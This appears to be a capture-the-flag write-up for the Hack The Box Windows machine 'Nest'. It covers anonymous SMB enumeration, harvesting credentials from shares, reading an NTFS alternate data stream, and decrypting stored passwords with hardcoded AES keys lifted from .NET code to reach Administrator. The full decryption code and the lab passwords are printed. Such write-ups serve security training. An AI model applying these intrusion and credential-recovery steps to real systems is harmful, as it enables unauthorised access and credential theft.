---
title: "Nest"
difficulty: Easy
os: Windows
points: 20
rating: 3.9
date: 2020-01-25
avatar: assets/htb/nest.png
htb_url: https://app.hackthebox.com/machines/Nest
---
## Overview

A relatively gentle Windows box that involved hopping back and forth between several locations, plus a touch of .NET reverse engineering. Thankfully there are tools and online services that make disassembling and recompiling painless even if you don't know VB.Net or C\#.

## Useful Skills and Tools

#### Enumerate SMB without credentials

`smbclient -U "" -L \\<server_IP>`

#### Copying an entire SMB folder recursively using smbclient:

> 1. Connect using: `smbclient -U <user> \\\\<ip>\\<folder> <password>`
> 2. smb: `tarmode` 
> 3. smb: `recurse` 
> 4. smb: `prompt` 
> 5. smb: `mget <folder_to_copy>`

#### Compile .NET code online

For compiling and running .NET code quickly on the fly, without setting up Visual Studio and its dependencies, I strongly suggest [`https://dotnetfiddle.net/`](https://dotnetfiddle.net/)

**Detecting and reading Alternate Data Streams \(ADS\) over SMB**

To read alternate data streams across SMB, run the `allinfo` command first, then `Get` the file with the relevant stream name tacked onto it. 

1. smb&gt; `allinfo <file>`
2. smb&gt; `get "<filename:streamname:$DATA>"`

#### Dealing with unknown ports

> When dealing with unknown ports, some things to try are:
>
> * nc 
> * telnet
> * SSH

#### Disassemble .NET binaries

Binaries compiled from .NET languages are pretty easy to convert back into their original source with [https://github.com/icsharpcode/AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy).  

## Enumeration

### Nmap scan

I began enumeration with an nmap scan against `<YOUR_IP>`. My usual options are: `-p-`, a shorthand that asks nmap to scan every TCP port, `-sC` which is equivalent to `--script=default` and fires off a set of nmap enumeration scripts at the target, `-sV` for a service scan, and `-oN <name>` to write the output to a file named `<name>`.

Initially the scan stalled until I tacked on `-Pn` to keep nmap from sending ICMP probes. From there it ran fine. Only a single port showed as open on the first pass, so I reran it to confirm and got identical results.

```bash
kac0@kalimaa:~/htb/nest$ nmap -p- -A -oA nest.full <YOUR_IP> -Pn

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 15:47 EDT
Nmap scan report for <YOUR_IP>
Host is up (0.14s latency).
Not shown: 65534 filtered ports
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
|_clock-skew: 4m00s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-05-30T19:56:10
|_  start_date: 2020-05-30T17:04:39

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 330.76 seconds
```

## Initial Foothold

With nothing else available, the obvious move was to attempt an SMB connection with no credentials:

```text
kac0@kalimaa:~/htb/nest$ smbclient -U "" -L \\<YOUR_IP>\
> 
Enter WORKGROUP\'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        Secure$         Disk      
        Users           Disk      
SMB1 disabled -- no workgroup available
```

That worked, returning a list of the machine's shares. `Data`, `Secure$`, and `Users` stood out as interesting since they aren't default shares. My first attempt at `Secure$` was rejected, so I moved on to `Data`.

```text
kac0@kalimaa:~/htb/nest$ smbclient -U "" \\\\<YOUR_IP>\\Data
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 18:53:46 2019
  ..                                  D        0  Wed Aug  7 18:53:46 2019
  IT                                  D        0  Wed Aug  7 18:58:07 2019
  Production                          D        0  Mon Aug  5 17:53:38 2019
  Reports                             D        0  Mon Aug  5 17:53:44 2019
  Shared                              D        0  Wed Aug  7 15:07:51 2019

                10485247 blocks of size 4096. 6543375 blocks available
smb: \>
```

Poking through the folders, I turned up one file with some interesting content inside the `Shared\Templates\HR\` folder.

```text
kac0@kalimaa:~/htb/nest$ cat 'Shared\Templates\HR\Welcome Email.txt' 

We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019

Thank you
HR
```

## Road to User

That `"Welcome Email.txt"` file handed over credentials for `TempUser`, the path to the user's folder, and the machine's hostname `HTB-NEST`. Armed with this, I again reached for `smbclient` and logged into the `Users` share.

```text
kac0@kalimaa:~/htb/nest$ smbclient -W HTB-NEST -U TempUser \\\\<YOUR_IP>\\Users
Enter HTB-NEST\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 25 18:04:21 2020
  ..                                  D        0  Sat Jan 25 18:04:21 2020
  Administrator                       D        0  Fri Aug  9 11:08:23 2019
  C.Smith                             D        0  Sun Jan 26 02:21:44 2020
  L.Frost                             D        0  Thu Aug  8 13:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 13:02:50 2019
  TempUser                            D        0  Wed Aug  7 18:55:56 2019

                10485247 blocks of size 4096. 6543375 blocks available
```

### Further enumeration

Hmm...a roster of the accounts that exist on this machine?

I could now browse into the `TempUser` folder, but all it held was an empty text file. The other users' folders were off-limits to me.

```text
smb: \> cd tempuser
smb: \tempuser\> ls
  .                                   D        0  Wed Aug  7 18:55:56 2019
  ..                                  D        0  Wed Aug  7 18:55:56 2019
  New Text Document.txt               A        0  Wed Aug  7 18:55:56 2019

                10485247 blocks of size 4096. 6545793 blocks available
```

Since that was a dead end, I went back and logged into the other shares. As `TempUser` I could reach folders in the `Data` share that were previously off-limits. After a while of looking around, I ran into a few files with useful content. The `\IT\Configs\NotepadPlusPlus\` folder held a couple of .xml files.

```text
smb: \IT\Configs\NotepadPlusPlus\> ls
  .                                   D        0  Wed Aug  7 15:31:37 2019
  ..                                  D        0  Wed Aug  7 15:31:37 2019
  config.xml                          A     6451  Wed Aug  7 19:01:25 2019
  shortcuts.xml                       A     2108  Wed Aug  7 15:30:27 2019

                10485247 blocks of size 4096. 6545921 blocks available
```

`shortcuts.xml` held nothing of value, but `config.xml` did.

```markup
<?xml version="1.0" encoding="Windows-1252" ?>
<NotepadPlus>

    ...snipped for brevity...

    <!-- The History of opened files list -->
    <FindHistory nbMaxFindHistoryPath="10" nbMaxFindHistoryFilter="10" nbMaxFindHistoryFind="10" nbMaxFindHistoryReplace="10" matchWord="no" matchCase="no" wrap="yes" directionDown="yes" fifRecuisive="yes" fifInHiddenFolder="no" dlgAlwaysVisible="no" fifFilterFollowsDoc="no" fifFolderFollowsDoc="no" searchMode="0" transparencyMode="0" transparency="150">
        <Find name="text" />
        <Find name="txt" />
        <Find name="itx" />
        <Find name="iTe" />
        <Find name="IEND" />
        <Find name="redeem" />
        <Find name="activa" />
        <Find name="activate" />
        <Find name="redeem on" />
        <Find name="192" />
        <Replace name="C_addEvent" />
    </FindHistory>
    <History nbMaxFile="15" inSubMenu="no" customLength="-1">
        <File filename="C:\windows\System32\drivers\etc\hosts" />
        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
    </History>
</NotepadPlus>
```

This config recorded the search terms and recently opened files from [Notepad++](https://notepad-plus-plus.org/) \(also my preferred Windows text editor, incidentally\). One entry jumped out: `\\HTB-NEST\Secure$\IT\Carl\Temp.txt`. Since I couldn't get into anything under `\Secure$\IT\` as this user, I kept exploring and made a note to circle back to it.

### Finding user creds

A bit more digging turned up an XML file in the `\IT\Configs\RU Scanner\` folder that looked promising.

```text
smb: \IT\Configs\RU Scanner\> ls
  .                                   D        0  Wed Aug  7 16:01:13 2019
  ..                                  D        0  Wed Aug  7 16:01:13 2019
  RU_config.xml                       A      270  Thu Aug  8 15:49:37 2019

                10485247 blocks of size 4096. 6545777 blocks available
```

The file held some handy information.

```markup
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>
```

This gave me credentials for another user, `c.smith`, apparently for LDAP \(port 389\), though the password was obfuscated. It looked like Base64, so I decoded it and got:

```text
kac0@kalimaa:~/htb/nest$ echo "fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=" | base64 -d
}13��=X�J�BA�X*�Wc�f���?βc
```

So it wasn't plain base64 after all. I spent some time trying to decode/decrypt it without luck, then gave up and continued searching. 

### Decrypting the user creds

Earlier that Notepad++ config pointed to a file opened on the `/Secure$/IT` share, so I decided to try grabbing the file directly, given that listing files in that directory had failed before.

```text
smb: \> get \IT\Carl\Temp.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \IT\Carl\Temp.txt
```

Interesting...it didn't deny me access, it just said the file no longer exists. So maybe the folder itself is reachable?

```text
smb: \> cd \IT\Carl
smb: \IT\Carl\> ls
  .                                   D        0  Wed Aug  7 15:42:14 2019
  ..                                  D        0  Wed Aug  7 15:42:14 2019
  Docs                                D        0  Wed Aug  7 15:44:00 2019
  Reports                             D        0  Tue Aug  6 09:45:40 2019
  VB Projects                         D        0  Tue Aug  6 10:41:55 2019

                10485247 blocks of size 4096. 6545905 blocks available
```

Yes!

_I figured the box's name had to be a reference to nesting dolls or similar. The entire time I kept having to return to spots I'd already visited to dig up details that pushed me a little further somewhere else._

After rummaging through `/IT/Carl/` for a while, I came across a Visual Basic project he had seemingly been developing. The earlier config file with the encrypted `c.smith` credentials was also called `RU Scanner`, so I was confident I was headed in the right direction.

```text
smb: \IT\Carl\VB Projects\WIP\RU\> ls
  .                                   D        0  Fri Aug  9 11:36:45 2019
  ..                                  D        0  Fri Aug  9 11:36:45 2019
  RUScanner                           D        0  Wed Aug  7 18:05:54 2019
  RUScanner.sln                       A      871  Tue Aug  6 10:45:36 2019

                10485247 blocks of size 4096. 6545777 blocks available
```

I pulled the entire `VB Projects` folder down to my machine and opened the solution file in Visual Studio Code.

#### Copying an entire SMB folder recursively using smbclient:

> \*Side note: Copying a complete folder over SMB takes a bit of setup. From [https://indradjy.wordpress.com/2010/04/14/getting-whole-folder-using-smbclient/](https://indradjy.wordpress.com/2010/04/14/getting-whole-folder-using-smbclient/):
>
> * [ ] Connect using: `smbclient -U <user> \\\\<ip>\\<folder> <password>`
> * [ ] smb: `tarmode` 
> * [ ] smb: `recurse` 
> * [ ] smb: `prompt` 
> * [ ] smb: `mget <folder_to_copy>\`

> `mget` will now allow the whole folder and subfolders to be copied recursively to your local `pwd` \(wherever you were before you logged into smbclient\).

![](assets/wu/nest/img-1.png)

Looking at the `Main()` function, I could tell the program was meant to read the `RU_config.xml` file we found earlier holding `c.smith`'s password, and then decrypt it with the `Utils.DecryptString()` function.

```text
Sub Main()
        Dim Config As ConfigFile = ConfigFile.LoadFromFile("/home/kac0/htb/nest/RU_Config.xml")
        Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}
    End Sub
```

I attempted to build and run the project, but couldn't get it to execute correctly for some reason. So I decided to go straight for the decryption routine and run that on its own to debug. Reading further through the code, I found what I needed in the `Utils.vb` source file. The `Decrypt()` function accepts our encrypted password along with a set of key and salt values, all hardcoded inside `Utils.DecryptString()`.

```text
Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function
```

```text
Public Shared Function Decrypt(ByVal cipherText As String, _
                               ByVal passPhrase As String, _
                               ByVal saltValue As String, _
                               ByVal passwordIterations As Integer, _
                               ByVal initVector As String, _
                               ByVal keySize As Integer) _
                        As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)

        Return plainText
    End Function
```

For compiling and running .NET code quickly on the fly, without needing Visual Studio and its dependencies installed, I strongly suggest the site [`https://dotnetfiddle.net/`](https://dotnetfiddle.net/).

I picked `VB.NET` as the language, pasted the relevant code into the site, and after some minor adjustments hit the `> Run` button at the top to see my code's output. Below you can see how I rewrote the `Main()` function to print the decrypted password to the console using the hardcoded values from `Utils.DecryptString()`.

```text
Public Function Main()
        Console.Writeline(Decrypt("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=", "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256))
        return 0
    End Function
```

![](assets/wu/nest/img-2.png)

As shown, my trimmed-down program ran and revealed the password for `c.smith`, which is `xRxRxPANCAK3SxRxRx`!

### User.txt

With credentials for a new user in hand, it was time to hunt for `user.txt`. It sat in the `Users` share, inside the `c.smith` folder.

```text
kac0@kalimaa:~/htb/nest$ smbclient -W HTB-NEST -U c.smith \\\\<YOUR_IP>\\Users xRxRxPANCAK3SxRxRx
Try "help" to get a list of possible commands.
smb: \> cd c.smith
smb: \c.smith\> ls
  .                                   D        0  Sun Jan 26 02:21:44 2020
  ..                                  D        0  Sun Jan 26 02:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 19:06:17 2019
  user.txt                            A       32  Thu Aug  8 19:05:24 2019

                10485247 blocks of size 4096. 6545935 blocks available
```

```text
kac0@kalimaa:~/htb/nest$ cat 'c.smith\user.txt'
8196************************4cbe
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User - c.smith

User milestone done, now to focus on privilege escalation.  I kept digging through the accessible `\HQK Reporting\` directory and found several very interesting files. 

```text
smb: \c.smith\> cd "HQK Reporting"
smb: \c.smith\HQK Reporting\> ls
  .                                   D        0  Thu Aug  8 19:06:17 2019
  ..                                  D        0  Thu Aug  8 19:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 08:18:42 2019
  Debug Mode Password.txt             A        0  Thu Aug  8 19:08:17 2019
  HQK_Config_Backup.xml               A      249  Thu Aug  8 19:09:05 2019

                10485247 blocks of size 4096. 6545935 blocks available
smb: \c.smith\HQK Reporting\> cd "AD Integration Module"
smb: \c.smith\HQK Reporting\AD Integration Module\> ls
  .                                   D        0  Fri Aug  9 08:18:42 2019
  ..                                  D        0  Fri Aug  9 08:18:42 2019
  HqkLdap.exe                         A    17408  Wed Aug  7 19:41:16 2019

                10485247 blocks of size 4096. 6545807 blocks available
```

`"Debug Mode Password.txt"` looked empty, but from prior CTF experience on Windows I've learned that when a filename advertises a password or flag, it usually holds one. Sometimes you just have to dig a little harder. Here, the user tried to hide the password from casual snooping by stashing it in an NTFS alternate data stream \(ADS\). More on ADS and how to spot them at [https://www.sans.org/blog/alternate-data-streams-overview/](https://www.sans.org/blog/alternate-data-streams-overview/). 

#### Detecting and reading Alternate Data Streams \(ADS\) over SMB

To find any alternate data streams in this file over SMB, run `allinfo`, then `Get` the file with the proper stream name appended. There's more detail at [https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux](https://www.sans.org/blog/alternate-data-streams-overview/).

```text
smb: \C.Smith\HQK Reporting\> allinfo
allinfo <file>
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt" 
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
change_time:    Thu Aug  8 07:08:17 PM 2019 EDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt:Password:$DATA"
smb: exit

kac0@kalimaa:~/htb/nest$ cat 'Debug Mode Password.txt:Password:$DATA' 
WBQ201953D8w
```

So now I held a password for something labeled `Debug Mode`, but no idea where it applied.  Next I opened the `HQK_Config_Backup.xml` file.  

```markup
kac0@kalimaa:~/htb/nest$ cat HQK\ Reporting\\HQK_Config_Backup.xml

<?xml version="1.0"?>
<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>4386</Port>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
</ServiceSettings>
```

### Dealing with unknown ports

`HQK_Config_Backup.xml` referenced port 4386, which was unfamiliar to me.  A fast web search turned up nothing beyond the fact that it falls in an unassigned range.  There are usually three approaches for unknown ports...netcat, telnet, and ssh.  Here, `nc` just echoed back the banner `HQK Reporting Service V1.2` and nothing more. `Telnet`, on the other hand, dropped me into an interactive prompt.

```text
kac0@kalimaa:~/htb/nest$ telnet <YOUR_IP> 4386
Trying <YOUR_IP>...
Connected to <YOUR_IP>.
Escape character is '^]'.

HQK Reporting Service V1.2

>whoami

Unrecognised command
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  COMPARISONS
[1]   Invoices (Ordered By Customer)
[2]   Products Sold (Ordered By Customer)
[3]   Products Sold In Last 30 Days

Current Directory: ALL QUERIES
>runquery 1

Invalid database configuration found. Please contact your system administrator
```

The HQK Reporting Service offered a bare-bones shell with a handful of commands.  Its intent was to let a user query invoices and products sold, but the database appeared to be disconnected from the program.  After spending time hunting for anything useful, I concluded it would only ever return the same "Invalid database configuration found." error.  Time to check whether the `Debug Mode` password I found earlier worked here.

```text
>debug WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>

>service

--- HQK REPORTING SERVER INFO ---

Version: 1.2.0.0
Server Hostname: HTB-NEST
Server Process: "C:\Program Files\HQK\HqkSvc.exe"
Server Running As: Service_HQK
Initial Query Directory: C:\Program Files\HQK\ALL QUERIES

>session

--- Session Information ---

Session ID: f5d4ced8-5de2-4fb4-80f7-84cebfea6538
Debug: True
Started At: 6/14/2020 9:53:05 AM
Server Endpoint: <YOUR_IP>:4386
Client Endpoint: 10.10.14.253:51630
Current Query Directory: C:\Program Files\HQK\ALL QUERIES

```

The password took, unlocking a few more commands.  The `service` and `session` commands revealed a little extra detail about the server program, but none of it seemed useful yet.  I kept poking around.

```text
>setdir ..

Current directory set to HQK
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
>showquery 1

File over size limit. Are you sure this is a HQK query file?
>showquery 3

<?xml version="1.0"?>
<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>4386</Port>
  <DebugPassword>WBQ201953D8w</DebugPassword>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
</ServiceSettings>

>setdir ldap

Current directory set to ldap
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: ldap
>showquery 2  

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```

The `showquery` command proved more helpful than the earlier `runquery`.  It could read out the contents of text files.  After a bit of searching, I found `ldap.conf`, which contained the Administrator password!  Sadly, like the user password, it was encrypted.

### Decrypting the Administrator password

My first move once I had the encrypted password was to feed it into the `decrypt()` function I'd built from the Visual Basic project earlier.  No luck though, since this password used a different format and threw the error `Padding is invalid and cannot be removed.` Either I lacked some input values, or this wasn't the right program to decrypt it. 

![](assets/wu/nest/img-3.png)

```text
Run-time exception (line -1): Padding is invalid and cannot be removed.

Stack Trace:

[System.Security.Cryptography.CryptographicException: Padding is invalid and cannot be removed.]
   at System.Security.Cryptography.CapiSymmetricAlgorithm.DepadBlock(Byte[] block, Int32 offset, Int32 count)
   at System.Security.Cryptography.CapiSymmetricAlgorithm.TransformFinalBlock(Byte[] inputBuffer, Int32 inputOffset, Int32 inputCount)
   at System.Security.Cryptography.CryptoStream.Read(Byte[] buffer, Int32 offset, Int32 count)
   at Utils.Decrypt(String cipherText, String passPhrase, String saltValue, Int32 passwordIterations, String initVector, Int32 keySize)
   at Utils.Main()
```

I combed through all my notes for any values to plug into the function, but nothing fit.  So I figured I'd try the `HqkLdap.exe` file I'd come across earlier in the `\c.smith\HQK Reporting\` folder, hoping it would help.  

### Disassembling the C\# .NET executable

I ran `ILSpy` to disassemble the executable back into readable .NET code \(here ILSpy identified the language as C\#\). This wonderfully handy tool is available at [https://github.com/icsharpcode/AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy).

The relevant decryption methods lived under the `HqkLdap.CR` namespace. This program was laid out very much like the earlier VB project `RU Scanner`, so finding the code I needed took little effort, even with the method names stripped down to plain two-letter names.

![](assets/wu/nest/img-4.png)

As before, I extracted just the function I needed to decrypt the password.  I wrote a small `Main()` that prints the decrypted password to the console.  Just like the earlier `Decrypt()` function, this one carried hardcoded initialization vector and salt values in the source.  In real-world scenarios this is poor practice and should be avoided. 

```text
// HqkLdap.CR
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class CR
{
    public void Main(){
        Console.WriteLine(DS("yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="));
    }

    private const string K = "667912";

    private const string I = "1L1SA61493DRV53Z";

    private const string SA = "1313Rf99";

    public static string DS(string EncryptedString)
    {
        if (string.IsNullOrEmpty(EncryptedString))
        {
            return string.Empty;
        }
        return RD("yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=", "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
    }

    private static string RD(string cipherText, string passPhrase, string saltValue, int passwordIterations, string initVector, int keySize)
    {
        byte[] bytes = Encoding.ASCII.GetBytes(initVector);
        byte[] bytes2 = Encoding.ASCII.GetBytes(saltValue);
        byte[] array = Convert.FromBase64String(cipherText);
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, bytes2, passwordIterations);
        checked
        {
            byte[] bytes3 = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)keySize / 8.0));
            AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
            aesCryptoServiceProvider.Mode = CipherMode.CBC;
            ICryptoTransform transform = aesCryptoServiceProvider.CreateDecryptor(bytes3, bytes);
            MemoryStream memoryStream = new MemoryStream(array);
            CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
            byte[] array2 = new byte[array.Length + 1];
            int count = cryptoStream.Read(array2, 0, array2.Length);
            memoryStream.Close();
            cryptoStream.Close();
            return Encoding.ASCII.GetString(array2, 0, count);
        }
    }
}
```

Having tidied up the code a bit, I pasted it into .NET Fiddle once more, this time choosing C\# as the language.  

![](assets/wu/nest/img-5.png)

Hitting `> Run` handed me the Administrator password `XtH4nkS4Pl4y1nGX`

### Root.txt

With the Administrator password, grabbing the root flag was trivial.  It lived in the `Administrator\Desktop\` folder within the `Users` share.

```text
kac0@kalimaa:~/htb/nest$ cat 'Administrator\Desktop\root.txt' 
2f1f************************3da1
```
